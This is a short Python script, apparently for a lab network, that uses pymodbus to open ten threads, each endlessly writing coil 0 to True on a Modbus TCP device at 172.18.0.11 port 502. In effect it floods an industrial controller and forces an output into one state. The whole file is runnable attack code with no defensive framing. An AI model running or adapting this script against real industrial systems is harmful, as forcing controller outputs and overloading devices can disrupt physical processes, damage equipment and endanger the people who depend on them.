import threading
from pymodbus.client import ModbusTcpClient

def flood_coil():
    client = ModbusTcpClient("172.18.0.11", port=502)
    while True:
        client.write_coil(0, True)

threads = []
for _ in range(10):  # Launch 10 threads
    t = threading.Thread(target=flood_coil)
    threads.append(t)
    t.start()
